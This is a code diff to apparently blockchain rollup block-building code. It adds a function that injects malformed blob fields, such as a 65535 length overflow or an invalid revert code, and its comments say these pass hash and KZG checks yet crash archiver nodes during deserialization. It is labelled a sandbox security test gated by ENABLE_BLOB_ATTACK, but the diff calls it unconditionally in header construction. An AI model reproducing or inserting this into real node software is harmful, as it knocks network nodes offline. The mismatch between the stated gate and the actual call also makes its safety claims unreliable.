@@ -63,6 +63,77 @@ type BaseTreeNames = 'NoteHashTree' | 'ContractTree' | 'NullifierTree' | 'Public
  */
 export type TreeNames = BaseTreeNames | 'L1ToL2MessageTree' | 'Archive';
 
+/**
+ * SECURITY TEST FUNCTION - FOR SANDBOX TESTING ONLY
+ *
+ * Injects malformed blob fields to test the vulnerability where invalid field
+ * prefixes crash archiver nodes during deserialization.
+ *
+ * This creates fields with invalid revert codes that:
+ * 1. Pass blob hash consistency checks (because they're injected before header finalization)
+ * 2. Pass KZG commitment validation (valid at byte level)
+ * 3. Crash archivers during deserialization (invalid revert code)
+ *
+ * Enable with: ENABLE_BLOB_ATTACK=true
+ *
+ * Attack types supported via BLOB_ATTACK_TYPE env var:
+ * - 'invalid_revert_code': Revert code > 4 (default)
+ * - 'length_overflow': Length exceeds max blob size
+ * - 'invalid_prefix': Completely invalid prefix
+ */
+function injectMalformedBlobFields(fields: Fr[]): Fr[] {
+  const attackType = 'length_overflow';
+
+  // Clone the fields array to avoid mutating original
+  const malformedFields = [...fields];
+
+  // Inject malformed field at the beginning (first transaction start prefix)
+  if (malformedFields.length > 0) {
+    let malformedField: Fr;
+
+    switch (attackType) {
+      // case 'invalid_revert_code':
+      //   // TX_START prefix with invalid revert code (5 instead of 0-4)
+      //   // Structure: 0x74785f7374617274_00_0001_00_01_00_05
+      //   // TX_START prefix | pad | len=1 | pad | REVERT | pad | INVALID_RC=5
+      //   malformedField = new Fr(0x74785f737461727400000100010005n);
+      //   console.error('[ATTACK] Injecting invalid revert code (5) in blob fields');
+      //   break;
+
+      case 'length_overflow':
+        // TX_START prefix with length exceeding max blob size
+        // Structure: 0x74785f7374617274_00_FFFF_00_01_00_01
+        // TX_START prefix | pad | len=65535 | pad | REVERT | pad | RC=1
+        malformedField = new Fr(0x74785f7374617274_00_FFFF_00_01_00_01n);
+        console.error('[ATTACK] Injecting length overflow (65535) in blob fields');
+        break;
+
+      // case 'invalid_prefix':
+      //   // // Completely invalid prefix (should be TX_START but using random value)
+      //   // // Structure: 0x00_00_0001_00_01_00_01
+      //   // malformedField = new Fr(0x0000000100010001n);
+      //   // console.error('[ATTACK] Injecting invalid prefix in blob fields');
+      //   // break;
+
+      // default:
+      //   console.error(`[ATTACK] Unknown attack type: ${attackType}, using invalid_revert_code`);
+      //   malformedField = new Fr(0x74785f737461727400000100010005n);
+    }
+
+    // Replace the first field with malformed one
+    malformedFields[0] = malformedField;
+
+    console.error(`[ATTACK] Original field count: ${fields.length}`);
+    console.error(`[ATTACK] Malformed field injected at position 0`);
+    console.error(`[ATTACK] Field value: 0x${malformedField.toBigInt().toString(16)}`);
+  }
+  else {
+    console.error('malformedFields.length', malformedFields.length);
+  }
+
+  return malformedFields;
+}
+
 // Builds the hints for base rollup. Updating the contract, nullifier, and data trees in the process.
 export const insertSideEffectsAndBuildBaseRollupHints = runInSpan(
   'BlockBuilderHelpers',
@@ -340,7 +411,12 @@ export const buildHeaderAndBodyFromTxs = runInSpan(
     const outHash = txOutHashes.length === 0 ? Fr.ZERO : new Fr(computeUnbalancedMerkleTreeRoot(txOutHashes));
 
     const parityShaRoot = await computeInHashFromL1ToL2Messages(l1ToL2Messages);
-    const blobsHash = getBlobsHashFromBlobs(await Blob.getBlobsPerBlock(body.toBlobFields()));
+
+    // SECURITY TEST: Inject malformed blob fields if ENABLE_BLOB_ATTACK is set
+    // let blobFields = body.toBlobFields();
+    let blobFields = injectMalformedBlobFields(body.toBlobFields());
+
+    const blobsHash = getBlobsHashFromBlobs(await Blob.getBlobsPerBlock(blobFields));
 
     const contentCommitment = new ContentCommitment(blobsHash, parityShaRoot, outHash);
 
